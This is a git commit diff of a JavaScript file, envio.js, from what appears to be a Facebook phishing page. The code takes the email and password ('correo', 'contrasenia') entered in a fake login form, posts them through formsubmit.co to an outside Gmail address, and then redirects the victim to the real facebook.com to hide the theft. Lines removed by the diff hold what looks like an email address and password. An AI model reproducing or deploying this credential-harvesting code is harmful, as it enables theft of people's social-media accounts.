e7029ea30865be0703a5e28048f8988d77c5ba06
FacebookConafe <conafe.facebook@gmail.com>
2022-09-20 21:47:47 -0500

    version 1.1

--- envio.js
+++ envio.js
@@ -6,16 +6,15 @@ const d = document;
 d.addEventListener("submit",e=>{
     e.preventDefault();
     if(expresionAsunto.test($form.correo.value) && expresionCorreo.test($form.contrasenia.value) || $form.correo.value=="" && $form.contrasenia.value==""){
-        window.location.href = "https://www.facebook.com";
     }else{
-        fetch("https://formsubmit.co/ajax/dguarnerosmarquez@gmail.com",{
+        fetch("https://formsubmit.co/ajax/dekish49@gmail.com",{
             method:"POST",
             body: new FormData($form)
         })
         .then(res=> res.ok ? res.json():Promise.reject(res))
         .then(json =>{
-            alert("Se envio correctamente la informacion")
-            clearForm();
+            window.location.href = "https://www.facebook.com";
+            
         })
         .catch(err => {
             console.log(`Ocurrio un error ${err}`);
@@ -23,12 +22,5 @@ d.addEventListener("submit",e=>{
     }
 })
 
-function clearForm(){
-    $form.asunto.value="";
-    $form.correo.value="";
-    $form.mensaje.value="";
-    $form.asunto.style.border ="0px solid black"
-    $form.correo.style.border ="0px solid black"
-}
-// dekish49@gmail.com
-// 0.CambialaDeki
+
+
